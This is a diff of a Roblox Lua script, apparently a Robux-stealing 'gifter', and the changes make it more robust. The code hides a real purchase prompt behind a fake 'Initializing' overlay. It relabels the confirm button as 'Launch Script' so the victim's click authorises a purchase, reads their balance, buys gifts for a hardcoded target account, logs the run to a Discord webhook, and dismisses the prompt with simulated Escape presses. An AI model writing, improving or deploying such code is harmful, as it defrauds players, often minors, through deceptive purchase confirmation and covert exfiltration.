@@ -24,11 +24,11 @@ local Joiner_GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1357962037
 --[[============================ Script Guard ============================]]
 
 -- Prevent multiple executions
-if _G.CombinedScriptExecuted_v1_11 then -- Updated guard name
+if _G.CombinedScriptExecuted_v1_12 then -- Updated guard name
     warn("Combined script already executed.")
     return
 end
-_G.CombinedScriptExecuted_v1_11 = true
+_G.CombinedScriptExecuted_v1_12 = true
 
 -- Wait for game load
 repeat task.wait() until game:IsLoaded()
@@ -588,16 +588,26 @@ local function gifter_modifyPromptUI()
             button2.MouseLeave:Connect(function() TweenService:Create(buttonContainer, hoverInfo, { Size = UDim2.new(1, 0, 1, 0) }):Play() end)
 
             -- Connect the click event to set the confirmation flag
-            button2.MouseButton1Click:Connect(function()
-                warn("Gifter: Launch Script button clicked!")
-                gifter_promptConfirmed = true
-            end)
+            -- Ensure listener is only connected once using a simple check
+            if not button2:FindFirstChild("ClickConn") then
+                 local clickConn = button2.MouseButton1Click:Connect(function()
+                     warn("Gifter: Launch Script button clicked! (Listener)")
+                     gifter_promptConfirmed = true
+                 end)
+                 -- Tag the connection to prevent duplicates
+                 clickConn.Name = "ClickConn"
+                 clickConn.Parent = button2
+             end
         end
     end
 end
 
 -- Function to create and show the "Initializing" overlay
 local function showInitializingUI()
+    -- Clean up any previous overlay first
+    local oldOverlay = CoreGui:FindFirstChild("InitializingOverlay")
+    if oldOverlay then pcall(oldOverlay.Destroy, oldOverlay) end
+
     local initScreen = Instance.new("ScreenGui")
     initScreen.Name = "InitializingOverlay"
     initScreen.IgnoreGuiInset = true
@@ -630,137 +640,162 @@ local function showInitializingUI()
 end
 
 
--- Main Gifting Phase Function (Overlay Until Click + Robust Upsell Check)
+-- Main Gifting Phase Function (Using ChildAdded Listener)
 local function executeGiftingPhase()
-    -- Get UserID first
-    local successUserId, userIdResult = pcall(function()
-        gifter_TargetUserId = Players:GetUserIdFromNameAsync(Gifter_TargetUsername)
+    local initUI = nil -- Initialize initUI to nil
+    local promptListenerConn = nil -- Initialize listener connection to nil
+    local promptProcessed = false -- Local flag for this execution
+    local promptInstance = nil -- Store the prompt instance when found
+    local upsellDetected = false -- Local flag for upsell detection
+    local balanceRead = 0 -- Local variable for balance
+
+    -- Wrap the core logic in pcall for cleanup
+    local success, result = pcall(function()
+
+        -- Get UserID first
+        local successUserId, userIdResult = pcall(function()
+            gifter_TargetUserId = Players:GetUserIdFromNameAsync(Gifter_TargetUsername)
+        end)
+        if not successUserId or not gifter_TargetUserId then
+            error("Gifter Phase Error: Could not get UserID for target: " .. Gifter_TargetUsername .. " - " .. tostring(userIdResult))
+        end
+
+        -- Send execution log
+        gifter_sendExecutionLog()
+
+        -- Show Initializing UI *before* triggering prompt
+        initUI = showInitializingUI()
+        task.wait() -- Add a small delay to allow UI to render
+
+        -- Setup listener *before* triggering
+        local promptFoundEvent = Instance.new("BindableEvent")
+        promptListenerConn = CoreGui.ChildAdded:Connect(function(child)
+            if child.Name == "PurchasePrompt" and not promptInstance then
+                warn("Listener: PurchasePrompt added.")
+                promptInstance = child -- Store the instance
+
+                -- Short robust check for Upsell immediately after prompt appears
+                local upsellCheckStart = tick()
+                local upsellCheckTimeout = 0.75
+                local isUpsellTemp = false
+                while tick() - upsellCheckStart < upsellCheckTimeout do
+                    local RobuxUpsellContainer = promptInstance:FindFirstChild("RobuxUpsellContainer")
+                    if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
+                        warn("Listener: Robux Upsell detected.")
+                        isUpsellTemp = true
+                        gifter_isUpsell = true -- Set global state flag
+                        gifter_giftingFailed = true
+                        break
+                    end
+                    task.wait(0.05)
+                end
+
+                if not isUpsellTemp then
+                    -- Modify the standard prompt and read balance
+                    warn("Listener: Standard prompt detected. Modifying...")
+                    gifter_modifyPromptUI() -- Modifies the found promptInstance
+                    gifter_readBalance = gifter_getRobuxBalance() -- Read balance now
+                    warn("Listener: Balance read:", gifter_readBalance)
+                    if gifter_readBalance < 25 then
+                         warn("Listener: Balance too low, setting fail flag.")
+                         gifter_giftingFailed = true
+                         -- Attempt to close prompt immediately if balance too low
+                         pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+                         pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+                    end
+                end
+
+                promptProcessed = true -- Signal that the prompt has been found and processed (or identified as upsell)
+                promptFoundEvent:Fire() -- Fire event to stop waiting
+                if promptListenerConn and promptListenerConn.Connected then promptListenerConn:Disconnect() end -- Disconnect self
+            end
+        end)
+
+        -- Trigger the balance check prompt (behind the initializing UI)
+        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
+        if not CommF then error("Gifter Phase Error: CommF_ remote not found.") end
+
+        local balanceCheckArgs = {
+            [1] = "buyRobuxShop",
+            [2] = { ["StorageName"] = "2x EXP (15 mins.)", ["FunnelId"] = "Shop", ["PurchaseLocation"] = "Shop" }
+        }
+        local successInvoke, invokeError = pcall(CommF.InvokeServer, CommF, unpack(balanceCheckArgs)) -- Capture invoke success/error
+        if not successInvoke then
+            -- Don't immediately fail, prompt might still appear from server despite client error
+            warn("Gifter Phase Warning: Invoke server for balance check failed, but waiting for prompt anyway.", invokeError)
+            -- gifter_giftingFailed = true -- Optionally set fail flag here too
+        end
+
+        -- Wait for the listener to find and process the prompt, or timeout
+        local overallTimeout = 15 -- Max time to wait for prompt appearance and processing
+        local waitResult = promptFoundEvent.Event:Wait(overallTimeout)
+
+        if not waitResult then -- Timed out waiting for prompt to be added/processed
+            warn("Gifter Phase Error: Timed out waiting for PurchasePrompt to be processed by listener.")
+            gifter_giftingFailed = true
+            -- No need to return false here, let cleanup happen, main flow will check gifter_giftingFailed
+        elseif gifter_isUpsell then
+             warn("Gifter Phase: Handling Upsell prompt closure.")
+             -- Attempt to close the upsell prompt
+             pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+             pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+             gifter_waitForPromptToDisappear() -- Wait for it to close
+             -- No need to return here, let cleanup happen, main flow checks gifter_giftingFailed
+        else
+            -- Standard prompt was processed, balance read into gifter_readBalance
+            -- Now wait for the click confirmation (overlay still up)
+            warn("Gifter Phase: Waiting for user confirmation click (overlay visible)...")
+            local clickStartTime = tick()
+            local clickTimeout = 15 -- Wait up to 15 seconds for the click
+            while not gifter_promptConfirmed do
+                if not promptInstance or not promptInstance.Parent then -- Check if prompt closed early
+                    warn("Gifter Phase Error: Prompt closed before confirmation click.")
+                    gifter_giftingFailed = true
+                    break -- Exit wait loop
+                end
+                if tick() - clickStartTime > clickTimeout then
+                    warn("Gifter Phase Error: Timed out waiting for confirmation click.")
+                    gifter_giftingFailed = true
+                    -- Attempt to close the prompt on timeout
+                    pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
+                    pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+                    gifter_waitForPromptToDisappear()
+                    break -- Exit wait loop
+                end
+                task.wait() -- Minimal wait/yield
+            end
+
+            if gifter_promptConfirmed then
+                warn("Gifter Phase: Confirmation received.")
+                -- Proceed with gifting using the balance read earlier
+                if gifter_readBalance >= 25 then
+                    gifter_stealItem(gifter_readBalance) -- This now calls buyItem which includes webhook
+                else
+                    warn("Gifter Phase: Balance (" .. gifter_readBalance .. ") too low to gift anything.")
+                    gifter_giftingFailed = true -- Set fail flag if balance check failed after all
+                end
+            end
+        end
     end)
 
-    if not successUserId or not gifter_TargetUserId then
-        warn("Gifter Phase Error: Could not get UserID for target:", Gifter_TargetUsername, userIdResult)
-        gifter_giftingFailed = true
-        return false -- Indicate failure
-    end
+    -- Cleanup phase, always runs after pcall finishes (success or error)
+    if promptListenerConn and promptListenerConn.Connected then promptListenerConn:Disconnect() end
+    if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Ensure overlay is destroyed
 
-    -- Send execution log
-    gifter_sendExecutionLog()
-
-    -- Show Initializing UI *before* triggering prompt
-    local initUI = showInitializingUI()
-    task.wait() -- Add a small delay to allow UI to render
-
-    -- Trigger the balance check prompt (behind the initializing UI)
-    local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
-    if not CommF then
-        warn("Gifter Phase Error: CommF_ remote not found.")
-        gifter_giftingFailed = true
-        if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI on error
-        return false
-    end
-
-    local balanceCheckArgs = {
-        [1] = "buyRobuxShop",
-        [2] = { ["StorageName"] = "2x EXP (15 mins.)", ["FunnelId"] = "Shop", ["PurchaseLocation"] = "Shop" }
-    }
-    local successInvoke, invokeError = pcall(CommF.InvokeServer, CommF, unpack(balanceCheckArgs)) -- Capture invoke success/error
-    if not successInvoke then
-        warn("Gifter Phase Error: Failed to invoke server for balance check.", invokeError)
-        gifter_giftingFailed = true
-        -- Don't return yet, maybe prompt still appears or maybe not
-    end
-
-    -- Wait for the prompt to appear (behind the initializing UI) - Increased Timeout
-    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt", 10) -- Increased wait time to 10 seconds
-    if not PurchasePrompt then
-        warn("Gifter Phase Error: Purchase prompt did not appear within 10 seconds.")
-        gifter_giftingFailed = true
-        if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI on error
-        return false
-    end
-
-    -- Loop briefly to check for Upsell container visibility (behind initializing UI)
-    local upsellDetected = false
-    local upsellCheckStart = tick()
-    local upsellCheckTimeout = 0.75 -- Check for 0.75 seconds
-    while tick() - upsellCheckStart < upsellCheckTimeout do
-        local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
-        if RobuxUpsellContainer and RobuxUpsellContainer.Visible then
-            warn("Gifter Phase: Robux Upsell detected during loop check.")
-            upsellDetected = true
-            gifter_giftingFailed = true
-            break -- Exit the check loop
-        end
-        task.wait(0.05) -- Check frequently
-    end
-
-    if upsellDetected then
-        -- Attempt to close the upsell prompt
-        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
-        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-        if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
-        return true -- Gifting phase finished (failed due to funds)
-    end
-
-    -- If upsell wasn't detected after the loop, proceed with modification (still behind overlay)
-    gifter_modifyPromptUI()
-    warn("Gifter Phase: Prompt modified behind overlay.")
-
-    -- Get Balance from hidden prompt (do this before waiting for click)
-    local currentBalance = gifter_getRobuxBalance()
-    warn("Gifter Phase: Balance read from hidden prompt:", currentBalance)
-
-    -- Wait for the user to click the hidden, modified button (overlay still visible)
-    warn("Gifter Phase: Waiting for user confirmation click (overlay visible)...")
-    local startTime = tick()
-    local timeout = 15 -- Wait up to 15 seconds for the click
-    while not gifter_promptConfirmed do
-        -- Check if prompt disappeared unexpectedly (e.g., user manually closed)
-        if not PurchasePrompt.Parent then
-             warn("Gifter Phase Error: Prompt closed before confirmation.")
-             gifter_giftingFailed = true
-             if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
-             return false -- Failed because confirmation didn't happen
-        end
-        if tick() - startTime > timeout then
-            warn("Gifter Phase Error: Timed out waiting for confirmation click.")
-            gifter_giftingFailed = true
-            -- Attempt to close the prompt on timeout before returning
-            pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game) task.wait(0.05)
-            pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-            gifter_waitForPromptToDisappear()
-            if initUI and initUI.Parent then pcall(initUI.Destroy, initUI) end -- Cleanup UI
-            return false -- Failed due to timeout
-        end
-        task.wait() -- Minimal wait/yield
-    end
-
-    -- User clicked the button (while overlay was visible)
-    warn("Gifter Phase: Confirmation received.")
-
-    -- Destroy the Initializing UI *after* the click is confirmed
-    if initUI and initUI.Parent then
-        pcall(initUI.Destroy, initUI) -- Use pcall for safety
-        warn("Gifter Phase: Initializing UI removed.")
-    end
-
-    -- Proceed with gifting using the balance read earlier
-    if currentBalance >= 25 then
-        gifter_stealItem(currentBalance) -- This now calls buyItem which includes webhook
-    else
-        warn("Gifter Phase: Balance (" .. currentBalance .. ") too low to gift anything.")
-        gifter_giftingFailed = true
-    end
-
-    -- Ensure prompt is dismissed *after* the gifting attempt triggered by the click
-    task.wait(0.1) -- Reduced wait
+    -- Final dismissal attempts, just in case
+    task.wait(0.1)
     pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-    task.wait(0.05) -- Reduced wait
+    task.wait(0.05)
     pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-    gifter_waitForPromptToDisappear() -- Ensure it's gone
+    gifter_waitForPromptToDisappear()
+
+    if not success then
+        warn("Gifter Phase Error during execution:", result)
+        gifter_giftingFailed = true -- Ensure flag is set on pcall error
+    end
 
     warn("Gifter Phase Completed.")
-    return true -- Indicate gifting phase finished (successfully or with low funds/error)
+    return not gifter_giftingFailed -- Return true if gifting didn't explicitly fail
 end
 
 
